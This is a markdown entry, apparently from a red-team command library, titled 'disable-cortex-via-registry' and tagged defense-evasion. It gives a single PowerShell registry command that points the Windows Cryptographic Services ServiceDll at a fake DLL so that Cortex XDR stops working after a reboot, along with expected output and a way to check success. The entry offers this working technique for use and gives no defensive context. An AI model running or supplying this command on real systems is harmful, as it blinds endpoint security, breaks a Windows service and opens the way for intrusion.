---
id: 35c51711-8a7d-4548-989b-843ead691e6c
name: disable-cortex-via-registry
type: command
executor: powershell
data: >-
  reg add
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t
  REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f
output: null
created_at: '2023-04-06T03:56:27.632930+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - defense-evasion
  - registry-modification
verified: true
validated: true
---

# disable-cortex-via-registry

## Command

```powershell
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f
```

## Description

Modifies the Windows Cryptographic Services registry to point to a non-existent DLL, breaking Cortex XDR's dependency and disabling it. Requires reboot.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /d nothing.dll | Path to fake DLL; can be any invalid value | Yes |

## Examples

### Basic Usage

```powershell
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f
```

## Expected Output

```
The operation completed successfully.
```

No errors indicate success; verify with 'reg query' and reboot to confirm service failure.

## Related

- [[procedures/disable-elastic-agent-and-cortex-xdr-on-windows]]
